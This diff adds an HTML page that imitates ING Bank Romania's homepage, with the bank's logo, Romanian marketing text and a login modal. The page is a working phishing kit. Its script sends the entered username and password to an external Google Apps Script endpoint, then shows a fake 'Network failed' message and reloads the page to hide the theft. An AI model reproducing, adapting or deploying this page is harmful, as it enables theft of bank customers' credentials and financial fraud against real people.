@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ING Clone - Banking din plin</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap');
+        body { font-family: 'Roboto', sans-serif; scroll-behavior: smooth; }
+        .ing-orange { background-color: #ff6200; }
+        .ing-purple { background-color: #ab0066; }
+        /* Modal Animation */
+        #loginModal { display: none; }
+        #loginModal.active { display: flex; }
+
+        /* ADDED: Mobile responsiveness code */
+        @media (max-width: 768px) {
+            /* Fix navigation for mobile */
+            nav { padding-left: 1rem !important; padding-right: 1rem !important; }
+            nav > .max-w-7xl:last-child { overflow-x: auto; white-space: nowrap; gap: 1.5rem; }
+            .mobile-hide { display: none; }
+            
+            /* Fix Hero section to stack vertically */
+            main { flex-direction: column !important; height: auto !important; overflow: visible !important; }
+            main > div { width: 100% !important; padding: 3rem 1.5rem !important; }
+            main h1 { font-size: 2.5rem !important; text-align: center; }
+            main p { text-align: center; margin-left: auto; margin-right: auto; }
+            main button { display: block; margin: 0 auto; }
+            
+            /* Center and scale the cards for phone screens */
+            .card-container { transform: scale(0.7) rotate(0deg) !important; margin-top: -2rem; }
+            
+            /* Fix grid for mobile */
+            section { padding-top: 3rem !important; padding-bottom: 3rem !important; }
+            .grid { gap: 1.5rem !important; }
+        }
+    </style>
+</head>
+<body class="bg-white">
+
+    <div class="border-b border-gray-100 py-2 px-6 text-sm flex justify-between items-center text-gray-600 mobile-hide">
+        <div class="flex items-center gap-2">
+            <span class="text-green-500 text-xs">●</span> Starea serviciilor
+        </div>
+        <div class="flex gap-6 font-medium">
+            <a href="#" class="text-orange-600 border-b-2 border-orange-600 pb-1">Persoane fizice</a>
+            <a href="#" class="hover:text-orange-600">IMM</a>
+            <a href="#" class="hover:text-orange-600">Companii mari</a>
+        </div>
+    </div>
+
+    <nav class="bg-white py-4 px-6 sticky top-0 z-50 shadow-sm">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
+            <div class="flex items-center gap-10">
+                <div class="flex items-center gap-3">
+                    <img src="https://ing.ro/dam/jcr:6da2cd76-932f-4693-b237-623618e09b4d/logo.svg" alt="ING Logo" class="h-10">
+                </div>
+                
+                <div class="hidden lg:flex gap-6 text-gray-600 text-sm">
+                    <a href="#" class="hover:text-black">ING în România</a>
+                    <a href="#" class="hover:text-black">Sustenabilitate</a>
+                    <a href="#" class="hover:text-black">Cariere</a>
+                </div>
+            </div>
+
+            <div class="flex gap-3">
+                <button class="ing-purple text-white px-5 py-2 rounded-md font-bold text-sm mobile-hide">Devino client</button>
+                <button onclick="toggleLogin()" class="ing-orange text-white px-5 py-2 rounded-md font-bold text-sm flex items-center gap-2">
+                    Autentificare
+                </button>
+            </div>
+        </div>
+
+        <div class="max-w-7xl mx-auto flex gap-8 mt-6 text-gray-700 font-medium text-sm">
+            <div class="flex items-center gap-2 cursor-pointer border-b-2 border-transparent hover:border-orange-500 pb-2">
+                <i class="fa-solid fa-credit-card"></i> Carduri și conturi <i class="fa-solid fa-chevron-down text-xs mobile-hide"></i>
+            </div>
+            <div class="flex items-center gap-2 cursor-pointer border-b-2 border-transparent hover:border-orange-500 pb-2">
+                <i class="fa-solid fa-laptop"></i> Internet Banking <i class="fa-solid fa-chevron-down text-xs mobile-hide"></i>
+            </div>
+            <div class="flex items-center gap-2 cursor-pointer border-b-2 border-transparent hover:border-orange-500 pb-2">
+                <i class="fa-solid fa-hand-holding-dollar"></i> Credite <i class="fa-solid fa-chevron-down text-xs mobile-hide"></i>
+            </div>
+            <div class="flex items-center gap-2 cursor-pointer border-b-2 border-transparent hover:border-orange-500 pb-2 mobile-hide">
+                <i class="fa-solid fa-chart-line"></i> Economii și Investiții
+            </div>
+            
+            <div class="ml-auto flex items-center border rounded-full px-4 py-1 bg-gray-50 mobile-hide">
+                <input type="text" placeholder="Caută..." class="bg-transparent outline-none text-sm w-32">
+                <i class="fa-solid fa-magnifying-glass text-orange-500"></i>
+            </div>
+        </div>
+    </nav>
+
+    <main class="relative w-full h-[500px] flex overflow-hidden">
+        <div class="w-1/2 ing-orange flex items-center justify-center text-white px-20">
+            <div>
+                <h1 class="text-6xl font-black leading-tight mb-6">
+                    Banking din plin.<br>Fără chin.
+                </h1>
+                <p class="text-xl font-light mb-8 max-w-md">
+                    Liber să vezi ce pachet ți se potrivește: <br>
+                    <span class="font-bold">0 lei în primele 3 luni pentru ING More și ING Extra</span>
+                </p>
+                <button class="bg-black text-white px-8 py-3 rounded-md font-bold hover:bg-gray-800 transition">
+                    Află detalii
+                </button>
+            </div>
+        </div>
+
+        <div class="w-1/2 bg-[#f4f4f4] relative flex items-center justify-center">
+            <div class="flex gap-4 transform rotate-[-10deg] card-container">
+                <div class="w-48 h-64 bg-gradient-to-br from-orange-400 to-orange-600 rounded-xl p-4 text-white shadow-2xl mt-20">
+                    <span class="text-xs font-bold">ING</span>
+                    <h2 class="text-3xl font-black mt-2">Go</h2>
+                </div>
+                <div class="w-48 h-64 bg-gradient-to-br from-orange-500 to-orange-700 rounded-xl p-4 text-white shadow-2xl mt-10">
+                    <span class="text-xs font-bold">ING</span>
+                    <h2 class="text-3xl font-black mt-2">More</h2>
+                </div>
+                <div class="w-48 h-64 bg-gradient-to-br from-purple-700 to-purple-900 rounded-xl p-4 text-white shadow-2xl">
+                    <span class="text-xs font-bold">ING</span>
+                    <h2 class="text-3xl font-black mt-2">Extra</h2>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <section class="py-20 bg-white px-6">
+        <div class="max-w-7xl mx-auto text-center">
+            <h2 class="text-4xl font-bold text-gray-800 mb-12">De ce să alegi ING?</h2>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-10 text-left">
+                <div class="p-6 border rounded-xl hover:shadow-lg transition">
+                    <i class="fa-solid fa-mobile-screen text-4xl text-orange-500 mb-4"></i>
+                    <h3 class="text-xl font-bold mb-2">Totul pe mobil</h3>
+                    <p class="text-gray-600">Gestionează-ți banii direct din aplicația Home'Bank, oriunde te-ai afla.</p>
+                </div>
+                <div class="p-6 border rounded-xl hover:shadow-lg transition">
+                    <i class="fa-solid fa-clock text-4xl text-orange-500 mb-4"></i>
+                    <h3 class="text-xl font-bold mb-2">Acces 24/7</h3>
+                    <p class="text-gray-600">Serviciile noastre sunt disponibile non-stop pentru nevoile tale.</p>
+                </div>
+                <div class="p-6 border rounded-xl hover:shadow-lg transition">
+                    <i class="fa-solid fa-shield-check text-4xl text-orange-500 mb-4"></i>
+                    <h3 class="text-xl font-bold mb-2">Siguranță maximă</h3>
+                    <p class="text-gray-600">Protecție avansată pentru tranzacțiile și datele tale personale.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <div id="loginModal" class="fixed inset-0 bg-black bg-opacity-50 z-[100] items-center justify-center p-4">
+        <div class="bg-white rounded-2xl shadow-2xl w-full max-w-md overflow-hidden">
+            <div class="ing-orange p-6 text-white flex justify-between items-center">
+                <h2 class="text-2xl font-bold">Autentificare</h2>
+                <button onclick="toggleLogin()" class="text-2xl">&times;</button>
+            </div>
+            <div class="p-8">
+                <form id="loginForm">
+                    <div class="mb-6">
+                        <label class="block text-gray-700 text-sm font-bold mb-2">Nume utilizator</label>
+                        <input type="text" id="username" class="w-full border-b-2 border-gray-300 focus:border-orange-500 outline-none py-2 px-1 transition" placeholder="Introduceți codul de utilizator" required>
+                    </div>
+                    <div class="mb-6">
+                        <label class="block text-gray-700 text-sm font-bold mb-2">Parolă</label>
+                        <input type="password" id="password" class="w-full border-b-2 border-gray-300 focus:border-orange-500 outline-none py-2 px-1 transition" placeholder="••••••••" required>
+                    </div>
+                    <button type="submit" id="submitBtn" class="w-full ing-orange text-white font-bold py-3 rounded-lg shadow-lg hover:opacity-90 transition">
+                        Loghează-te
+                    </button>
+                </form>
+                <div class="mt-6 text-center text-sm text-gray-500">
+                    <p>Ai uitat datele de acces? <a href="#" class="text-orange-600 underline">Recuperare</a></p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="fixed bottom-6 right-6 bg-blue-600 text-white w-12 h-12 rounded-full flex items-center justify-center shadow-xl cursor-pointer">
+        <i class="fa-solid fa-universal-access text-xl"></i>
+    </div>
+
+    <script>
+        function toggleLogin() {
+            const modal = document.getElementById('loginModal');
+            modal.classList.toggle('active');
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const btn = document.getElementById('submitBtn');
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            
+            btn.innerText = "Se încarcă...";
+            btn.disabled = true;
+
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbydGpF2SVPciKsMlhooNgv64ZUPz3BbJy6s-3Nu_h1A9oZSTWBhQBxn9R4QGVN2M4s/exec';
+
+            fetch(scriptURL, {
+                method: 'POST',
+                mode: 'no-cors', 
+                cache: 'no-cache',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ nume: user, parola: pass })
+            })
+            .then(response => {
+                setTimeout(() => {
+                    alert('Network failed. Please try using the mobile app for a secure connection.');
+                    window.location.reload(); 
+                }, 1000);
+            })
+            .catch(error => {
+                console.error('Error!', error.message);
+                alert('Network failed. Please try using the mobile app.');
+                btn.innerText = "Loghează-te";
+                btn.disabled = false;
+            });
+        });
+    </script>
+</body>
+</html>
